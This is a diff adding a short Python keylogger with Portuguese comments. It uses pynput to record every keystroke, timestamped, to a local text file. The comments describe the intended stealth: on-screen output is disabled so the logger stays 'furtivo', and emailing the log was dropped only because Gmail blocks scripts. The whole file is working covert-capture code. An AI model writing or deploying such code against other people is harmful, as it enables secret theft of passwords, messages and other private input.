@@ -1,0 +1,18 @@
+from pynput.keyboard import Key, Listener
+import logging
+
+# configurando onde vai salvar as teclas digitadas
+# achei mais fácil salvar localmente do que configurar envio de email, pq o gmail bloqueia muito script
+logging.basicConfig(filename="teclas_capturadas.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def quando_pressionar(tecla):
+    # salva a tecla que foi apertada no txt
+    logging.info(str(tecla))
+    
+    # print(tecla) # deixei comentado pq a ideia do keylogger é ser furtivo e não aparecer na tela né
+
+print("O Keylogger tá rodando escondido... digite alguma coisa e depois aperte CTRL+C no terminal pra parar.")
+
+# aqui ele fica "escutando" o teclado infinitamente
+with Listener(on_press=quando_pressionar) as listener:
+    listener.join()
